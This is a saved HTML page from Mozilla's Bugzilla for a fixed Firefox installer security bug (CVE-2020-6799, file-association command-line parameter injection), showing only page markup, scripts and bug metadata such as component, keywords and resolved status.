<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1606596 - (CVE-2020-6799) File association Remote Code Execution via command line parameter injection in Firefox">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1606596">
<meta property="og:description"
      content="RESOLVED (mhowell) in Firefox - Installer. Last updated 2020-06-05.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1606596 - (CVE-2020-6799) File association Remote Code Execution via command line parameter injection in Firefox</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1606596&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1606596">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1606596">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/yui.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/global.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/util.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"types\":[\"tracking\"],\"comments\":{\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_esr68\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox73\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox74\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"}},\"flags\":{\"project\":{\"cf_install_update_workflow\":\"---\",\"cf_root_cause\":\"---\",\"cf_webcompat_priority\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_a11y_review_project_flag\":\"---\"},\"tracking\":{\"cf_status_firefox73\":\"fixed\",\"cf_tracking_firefox95\":\"---\",\"cf_tracking_firefox93\":\"---\",\"cf_status_firefox_esr68\":\"fixed\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_firefox94\":\"---\",\"cf_status_firefox74\":\"fixed\",\"cf_tracking_firefox73\":\"+\",\"cf_status_firefox95\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_status_firefox72\":\"wontfix\",\"cf_status_firefox_esr91\":\"---\",\"cf_tracking_firefox74\":\"+\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_tracking_firefox_esr68\":\"73+\",\"cf_status_firefox94\":\"---\"}}}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1606596;
  BUGZILLA.bug_title = '1606596 - (CVE-2020-6799) File association Remote Code Execution via command line parameter injection in Firefox';
  BUGZILLA.bug_summary = 'File association Remote Code Execution via command line parameter injection in Firefox';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1606596';
  BUGZILLA.bug_keywords = 'csectype-priv-escalation, sec-moderate',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/field.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/comments.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="G3ksDJFfY9rhVWwEDjA9kwqQEyK5o3pQA9DBUYoXXqSTrd4J" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1606596">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1606596"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1606596 - (CVE-2020-6799) File association Remote Code Execution via command line parameter injection in Firefox">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="HIWIPfoN56fpiQehehxS23bTuFdj6fpet241IKuK0aIlq3X8XPCRrqv9YJXqb0wDZaU4CDnY69hsPsXgCRaptJfe4s6Gu3XnZre1O8Bb8pSZUW16aFq9iuVqI1ljzrq7nHpv7QeuhohMfXCo6hM6EtqZ3kNdmI1TnNFYdjuk5fIYNLT6eQzLpZbDPoGK0NctiAR1vLWPIbhqcnsYBEvvbVxTsWp6arOcFIpnHlNPGnaJdk6g8R9e0oKR6HoQ8hIV">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1606596" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623479-l6_-INc3OluWr3k1TsXGzj5PGJPx2Bs6NFa9HV37y4U">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1606596" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1606596" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1606596">Bug 1606596</a>
          <span class="edit-hide">(CVE-2020-6799)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2020-01-01 23:54 PST" data-time="1577951683">2 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2020-01-14 01:21 PST" data-time="1578993686">2 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">File association Remote Code Execution via command line parameter injection in Firefox</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            File association Remote Code Execution via command line parameter injection in Firefox

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Firefox :: Installer, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Firefox" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Firefox
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Firefox</div>
            <div class="description">For bugs in  Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Core">Core</a> product. Bugs for developer tools (F12) should be filed in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools">DevTools</a> product.  (<a href="https://wiki.mozilla.org/Modules/All#Firefox">more info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Firefox&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Firefox"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Firefox"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Firefox&component=Installer#Installer" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Installer
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Firefox :: Installer</div>
            <div class="description">Bugs and feature requests for the Firefox application install wizard.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Firefox&amp;component=Installer&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Firefox&amp;component=Installer&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Firefox&amp;component=Installer"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Firefox" data-component="Installer"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-version" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            unspecified

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            normal

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;id&quot;:1606596,&quot;cf_tracking_firefox94&quot;:&quot;---&quot;,&quot;dupe_of&quot;:null,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;priority&quot;:&quot;--&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox73&quot;:&quot;fixed&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;cf_install_update_workflow&quot;:&quot;---&quot;,&quot;cf_status_firefox72&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_firefox73&quot;:&quot;+&quot;,&quot;cf_status_firefox74&quot;:&quot;fixed&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr68&quot;:&quot;fixed&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;target_milestone&quot;:&quot;Firefox 74&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr68&quot;:&quot;73+&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;flags&quot;:[{&quot;name&quot;:&quot;sec-bounty&quot;,&quot;status&quot;:&quot;+&quot;},{&quot;name&quot;:&quot;qe-verify&quot;,&quot;status&quot;:&quot;-&quot;}],&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox74&quot;:&quot;+&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;keywords&quot;:[&quot;csectype-priv-escalation&quot;,&quot;sec-moderate&quot;]}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

